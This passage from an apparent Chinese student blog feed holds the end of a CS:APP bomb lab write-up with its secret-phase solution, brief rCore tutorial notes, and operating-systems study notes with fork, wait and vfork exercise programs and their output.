class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><br><br></code></pre></td></tr></table></figure><p>再想想题目，我们最后需要构造这样的结构：</p><ul><li><p>返回值为2，有一种可能：</p><ul><li>通过最外层调用中，输入值小于节点值实现，要求最外层-1次调用返回值为1；</li></ul></li><li><p>故：倒数第二层调用必须返回值为1；</p></li><li><p>若某层返回值为1，这说明了什么捏？</p></li><li><p>说明该层调用的内一层调用，必须走a1 != a2 路线，且要求内层调用返回值为0；</p></li><li><p>若某层返回值为0，这又说明了什么捏？</p></li><li><p>一定是第一种调用，也就是a1 &gt; =a2，且内层一直是第一种调用，输入值小于节点值。</p></li><li><p>综上，输入值应满足：一直小于某些节点值，以及最外一层的节点值，但最内一层，输入值必须等于某一节点值，否则循环不完了。</p></li><li><p>有以下节点值：0x24, 0, 0x8, 0x32,0x16,0x2d,0x6,0x6b,0x0;</p></li><li><p>选择0x24尝试：</p><ul><li>先是等于，然后直接返回，不行；</li></ul></li><li><p>选择0x0尝试：</p><ul><li>0一直是最小的数，也不可能实现；</li></ul></li><li><p>选择0x8尝试：</p><ul><li>8 &lt; 24 , goto 1, node -&gt; node + 8, 8 &gt; 6, goto 2, node += 16,  16 &gt; 8 , 2d&gt;8，</li></ul></li><li><p>太多数据，不再尝试。</p></li><li><p><strong>再次分析</strong>，由于最初的节点是0x24，且最初节点必须走第一种跳转，也就是说第一层节点值大于输入值。</p></li><li><p><strong>然后</strong>，节点+8，来到50号的 0x8，这里要求，返回值为1，也就是传入值 &gt;=8，然后最后一层需要相等。这样一来，答案就明朗了，<strong>答案就是0x16</strong>。</p></li><li><p>测试一下：</p></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">22</span><br>Wow! Yo<span class="hljs-string">u&#x27;ve defused the secret stage!</span><br><span class="hljs-string">Congratulations! You&#x27;</span>ve defused the bomb!<br><br></code></pre></td></tr></table></figure><p>ok</p><p>全部通过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">kawa</span>@kawa-virtual-machine:~/Desktop$ ./bomb<br><span class="hljs-attribute">Welcome</span> to my fiendish little bomb. You have <span class="hljs-number">6</span> phases with<br><span class="hljs-attribute">which</span> to blow yourself up. Have a nice day!<br><span class="hljs-attribute">I</span> am not part of the problem. I am a Republican.<br><span class="hljs-attribute">Phase</span> <span class="hljs-number">1</span> defused. How about the next one?<br><span class="hljs-attribute">1</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span> <span class="hljs-number">16</span> <span class="hljs-number">32</span><br><span class="hljs-attribute">That</span>&#x27;s number <span class="hljs-number">2</span>.  Keep going!<br><span class="hljs-attribute">1</span> <span class="hljs-number">332</span><br><span class="hljs-attribute">Halfway</span> there!<br><span class="hljs-attribute">14</span> <span class="hljs-number">45</span> DrEvil<br><span class="hljs-attribute">So</span> you got that one.  Try this one.<br><span class="hljs-attribute">5</span> <span class="hljs-number">115</span><br><span class="hljs-attribute">Good</span> work!  <span class="hljs-literal">On</span> to the next...<br><span class="hljs-attribute">2</span> <span class="hljs-number">4</span> <span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">Curses</span>, you&#x27;ve found the secret phase!<br><span class="hljs-attribute">But</span> finding it and solving it are quite different...<br><br><span class="hljs-attribute">22</span><br><span class="hljs-attribute">Wow</span>! You&#x27;ve defused the secret stage!<br><span class="hljs-attribute">Congratulations</span>! You&#x27;ve defused the bomb!<br><br></code></pre></td></tr></table></figure><p><strong>实验至此结束</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>rCore</title>
    <link href="/2023/04/08/rCore/"/>
    <url>/2023/04/08/rCore/</url>
    
    <content type="html"><![CDATA[<h1 id="rCore实验记录"><a href="#rCore实验记录" class="headerlink" title="rCore实验记录"></a>rCore实验记录</h1><p>实验指导书：</p><p><a href="http://rcore-os.cn/rCore-Tutorial-Book-v3/chapter1/0intro.html">http://rcore-os.cn/rCore-Tutorial-Book-v3/chapter1/0intro.html</a></p><p>第零章配置环境等略去，指导书中有详细指导。</p><h1 id="第一章-应用程序与基本执行环境"><a href="#第一章-应用程序与基本执行环境" class="headerlink" title="第一章 应用程序与基本执行环境"></a>第一章 应用程序与基本执行环境</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本章展现了操作系统的一个基本目标：让应用与硬件隔离，简化了应用访问硬件的难度和复杂性。</p><p>程序员初学编程之时，往往是通过一行 “hello world” 打开新世界大门，短短几行 C 代码，简单的编译语句，再使用<code>./</code>执行之，就能输出。这是操作系统、硬件等一系列复杂支持所提供的开发环境。</p><p>本章主要是讲解如何设计和实现建立在裸机上的执行环境，并让应用程序能够在这样的执行环境中运行。</p>]]></content>
    
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Operating Systems</title>
    <link href="/2023/03/23/Operating-Systems/"/>
    <url>/2023/03/23/Operating-Systems/</url>
    
    <content type="html"><![CDATA[<h1 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h1><h1 id="第一章-关于本书的对话"><a href="#第一章-关于本书的对话" class="headerlink" title="第一章 关于本书的对话"></a>第一章 关于本书的对话</h1><p>关于 <strong>Three Easy Pieces</strong> 指的是 **虚拟化(virtualization), 并发(concurrency), 持久性(persistence)**这是我们要学习的三个重要概念。</p><h1 id="第二章-操作系统介绍"><a href="#第二章-操作系统介绍" class="headerlink" title="第二章 操作系统介绍"></a>第二章 操作系统介绍</h1><p>有一类软件负责让程序运行变得更加容易，允许你同时运行多个程序，允许程序共享内存，让程序能与设备进行交互，以及其他类似有趣的工作。这些软件称为 <strong>操作系统(Operating System，OS)</strong> 。</p><h1 id="第三章-关于虚拟化的对话"><a href="#第三章-关于虚拟化的对话" class="headerlink" title="第三章 关于虚拟化的对话"></a>第三章 关于虚拟化的对话</h1><p>虚拟化：给一群人一共一个桃子，但让每个人认为，他独占这个桃子。</p><h1 id="第四章-抽象：进程"><a href="#第四章-抽象：进程" class="headerlink" title="第四章 抽象：进程"></a>第四章 抽象：进程</h1><p>进程：运行中的程序。<br>时分共享CPU（time sharing）：让一个进程只允许一个时间片，然后切换到其他进程。</p><h2 id="进程-API"><a href="#进程-API" class="headerlink" title="进程 API"></a>进程 API</h2><p>所有现代操作系统都以某种形式提供这些 API</p><ul><li><strong>创建（create）</strong>：操作系统包含一些创建新进程的方法。</li><li><strong>销毁（destroy）</strong>：销毁进程的接口。</li><li><strong>等待（wait）</strong>：等待进程停止运行。</li><li><strong>其他控制（miscellaneous control）</strong>：例如暂停、恢复等操作。</li><li><strong>状态（statu）</strong>：获取进制的状态信息。</li></ul><h2 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h2><p>首先，将程序（代码、静态数据）加载（load）到内存中，加载到进程的地址空间中。<br><img src="/2023/03/23/Operating-Systems/p1.png"></p><p>现代操作系统是懒加载（lazily load），即仅在程序执行期间需要的代码或数据片段，才会加载。</p><p>加载了代码与静态数据到内存后，操作系统需要为程序的运行时栈分配一些内存。<br>再为堆也分配一些内存。并执行一些与I/O相关的工作。</p><p>当OS终于为程序执行搭好了舞台，他还有最后一项任务：启动程序。在入口处运行，即 main()。通过跳转到 main()例程，OS 将 CPU 的控制权转移到新创建的进程中。</p><h2 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h2><p>进程可以处于以下三种状态之一：</p><ul><li><strong>运行（running）</strong>：运行状态下，进程在处理器上运行。</li><li><strong>就绪（ready）</strong>：程序准备好运行。</li><li><strong>阻塞（blocked）</strong>：阻塞状态下，一个进程执行了某种操作，直到其他事件发生才会准备运行。例如一个进程向磁盘发起 I/O 请求，它会被阻塞，其他进程可以使用处理器。</li></ul><p><img src="/2023/03/23/Operating-Systems/p2.png"></p><h1 id="第五章-插叙：进程-API"><a href="#第五章-插叙：进程-API" class="headerlink" title="第五章 插叙：进程 API"></a>第五章 插叙：进程 API</h1><h2 id="fork-系统调用"><a href="#fork-系统调用" class="headerlink" title="fork()系统调用"></a>fork()系统调用</h2><p>系统调用 fork()用于创建新进程。</p><figure class="highlight c"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br>    <span class="hljs-type">int</span>  <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br> &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world (pid:%d)\n&quot;</span>, (<span class="hljs-type">int</span>) getpid());<br>     <span class="hljs-type">int</span> rc = fork();<br>     <span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// fork failed; exit</span><br>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br> &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rc == <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// child (new process)</span><br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am child (pid:%d)\n&quot;</span>, (<span class="hljs-type">int</span>) getpid());<br> &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// parent goes down this path (main)</span><br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am parent of %d (pid:%d)\n&quot;</span>,<br>     rc, (<span class="hljs-type">int</span>) getpid()); <br> &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125; <br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">prompt</span>&gt; ./<span class="hljs-selector-tag">p1</span><br><span class="hljs-selector-tag">hello</span> <span class="hljs-selector-tag">world</span> (<span class="hljs-attribute">pid</span>:<span class="hljs-number">29146</span>)<br><span class="hljs-selector-tag">hello</span>, <span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">am</span> <span class="hljs-selector-tag">parent</span> <span class="hljs-selector-tag">of</span> <span class="hljs-number">29147</span> (<span class="hljs-attribute">pid</span>:<span class="hljs-number">29146</span>)<br><span class="hljs-selector-tag">hello</span>, <span class="hljs-selector-tag">I</span> <span class="hljs-selector-tag">am</span> <span class="hljs-selector-tag">child</span> (<span class="hljs-attribute">pid</span>:<span class="hljs-number">29147</span>)<br><span class="hljs-selector-tag">prompt</span>&gt; <br></code></pre></td></tr></table></figure><p>fork()出的子进程不会从 main()函数开始执行（因此hello world 信息只输出了一次），而是直接从 fork()系统调用返回。就好像它自己调用了 fork()。<br>子进程并不是完全拷贝了父进程。具体来说，虽然它拥有自己的地址空间、寄存器、程序计数器等，但它从 fork() 返回的值是不同的。父进程获得的 fork() 返回值是子进程的 pid ， 而子进程获得的返回值是 0 。这个差别很重要。<br>且父、子进程输出是不确定的，即有可能父进程先运行，也有可能子进程先运行。<br>CPU 调度程序（scheduler） 决定了某个时刻哪个进程被执行。</p><h2 id="wait-系统调用"><a href="#wait-系统调用" class="headerlink" title="wait() 系统调用"></a>wait() 系统调用</h2><p>当父进程调用 wait() 于某处时，若父进程碰巧被先执行，也会延迟执行，等到子进程执行完毕，wait() 才返回父进程。</p><h2 id="exec-系统调用"><a href="#exec-系统调用" class="headerlink" title="exec() 系统调用"></a>exec() 系统调用</h2><p>exec() 给定可执行程序的名称及需要的参数后，exec() 会从可执行程序中加载代码和静态数据，并用它覆写自己的代码段，堆、栈及其他内存空间也会被重新初始化。子进程执行exec()之后，几乎就像 p3.c 未曾运行过一样，即对 exec() 的成功调用<strong>永远不会返回</strong></p><p>如下例中，子进程调用 exec() 后，exec调用的程序执行完以后，子进程内未进行的代码段不会进行，而是直接去进行排队等待的父进程去了。</p><p><img src="/2023/03/23/Operating-Systems/p3.png"></p><p>关于管道：pipe() 系统调用。这种情况下，一个进程的输出被链接到了一个内核管道(pipe)上(队列), 另一个进程的输入也被链接到同一个管道上。因此，前一个进程的输出可以无缝地作为后一个进程的输入，许多命令可以用这种方式串联起来，完成某项任务。（23.03.23更）</p><h2 id="第五章课后习题"><a href="#第五章课后习题" class="headerlink" title="第五章课后习题"></a>第五章课后习题</h2><p>1.编写一个调用 fork()的程序。在调用 fork()之前，让主进程访问一个变量（例如 x） 并将其值设置为某个值（例如 100）。子进程中的变量有什么值？当子进程和父进程都改变 x 的值时，变量会发生什么？</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> x = <span class="hljs-number">100</span>;<br>        <span class="hljs-type">int</span> rc = fork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am Child (pid : %d)\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>                x += <span class="hljs-number">1</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x has been changed to = %d \n&quot;</span>,x);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello, I am Parent of %d (pid : %d)\n&quot;</span>,rc,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>                x += <span class="hljs-number">10</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x has been changed to = %d \n&quot;</span>,x);<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The value x = %d \n&quot;</span>,x);<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">kawa@kawa-virtual-machine:~/Desktop$ ./h1<br>hello world ( pid : 3990 )<br>hello, I am Parent of 3991 (pid : 3990)<br>The value x = 100 <br>The value x has been changed to = 110 <br>The value x = 110 <br>hello, I am Child (pid : 3991)<br>The value x = 100 <br>The value x has been changed to = 101 <br>The value x = 101 <br><br></code></pre></td></tr></table></figure><p>可见，父、子进程中，x 初始值均为 100，因为 fork() 时，是复制的当时的程序数据，给到子进程，所以 x 初值均为 100 。</p><p>3.使用 fork()编写另一个程序。子进程应打印“hello”，父进程应打印“goodbye”。你应该尝试确保子进程始终先打印。你能否不在父进程调用 wait()而做到这一点呢？</p><p>使用vfork() 实现这一点：</p><p>代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> rc = vfork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello\n&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;goodbye!\n&quot;</span>);<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs typescript">kawa<span class="hljs-meta">@kawa</span>-virtual-<span class="hljs-attr">machine</span>:~<span class="hljs-regexp">/Desktop$ ./</span>h3<br>hello world ( pid : <span class="hljs-number">5321</span> )<br>hello<br>goodbye!<br></code></pre></td></tr></table></figure><p>可见，vfork() 成功完成了其使命。</p><p>5.现在编写一个程序，在父进程中使用 wait()，等待子进程完成。wait()返回什么？如果你在子进程中使用 wait()会发生什么？</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> rc = fork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is Child pid = %d \n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is parent pid = %d \n&quot;</span> ,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-type">int</span> w = wait();<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the return value of wait() is : %d \n&quot;</span>,w);<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp">kawa@kawa-<span class="hljs-keyword">virtual</span>-machine:~/Desktop$ ./<span class="hljs-function">h5</span><br><span class="hljs-function">hello <span class="hljs-title">world</span> (<span class="hljs-params"> pid : <span class="hljs-number">5479</span> </span>)</span><br><span class="hljs-function">This <span class="hljs-keyword">is</span> parent pid</span> = <span class="hljs-number">5479</span> <br>This <span class="hljs-keyword">is</span> Child pid = <span class="hljs-number">5480</span> <br><span class="hljs-function">the <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> of <span class="hljs-title">wait</span>() <span class="hljs-keyword">is</span> : 5480</span><br></code></pre></td></tr></table></figure><p>显然，wait() 返回值为 子进程的pid。</p><p>当子进程wait时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world ( pid : %d )\n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>        <span class="hljs-type">int</span> rc = fork();<br>        <span class="hljs-keyword">if</span>(rc &lt; <span class="hljs-number">0</span> )<br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fork failed\n&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(rc ==<span class="hljs-number">0</span> )<br>        &#123;<br><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is Child pid = %d \n&quot;</span>,(<span class="hljs-type">int</span>) getpid());<br>                <span class="hljs-type">int</span> w = wait();<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the return value of wait() is : %d \n&quot;</span>,w);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is parent pid = %d \n&quot;</span> ,(<span class="hljs-type">int</span>) getpid());<br>        &#125;<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp">kawa@kawa-<span class="hljs-keyword">virtual</span>-machine:~/Desktop$ ./<span class="hljs-function">h5</span><br><span class="hljs-function">hello <span class="hljs-title">world</span> (<span class="hljs-params"> pid : <span class="hljs-number">5569</span> </span>)</span><br><span class="hljs-function">This <span class="hljs-keyword">is</span> parent pid</span> = <span class="hljs-number">5569</span> <br>This <span class="hljs-keyword">is</span> Child pid = <span class="hljs-number">5570</span> <br><span class="hljs-function">the <span class="hljs-keyword">return</span> <span class="hljs-keyword">value</span> of <span class="hljs-title">wait</span>() <span class="hljs-keyword">is</span> : -1 </span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>可见，子进程中调用 wait，返回值为 -1。</p><p>因为wait() 返回值为成功结束的子进程，而子进程中无法收集到更下一级的子进程pid（因为不存在），就会导致回收失败，返回值为-1。</p><p>7.编写一个创建子进程的程序，然后在子进程中关闭标准输出（STDOUT_FILENO）。 如果子进程在关闭描述符后调用 printf()打印输出，会发生什么？</p><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> rc = fork();<br><span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fork failed&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rc == <span class="hljs-number">0</span>) &#123;<br>close(STDOUT_FILENO);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;output child\n&quot;</span>);<br>&#125;<br>wait(<span class="hljs-literal">NULL</span>);<br><span 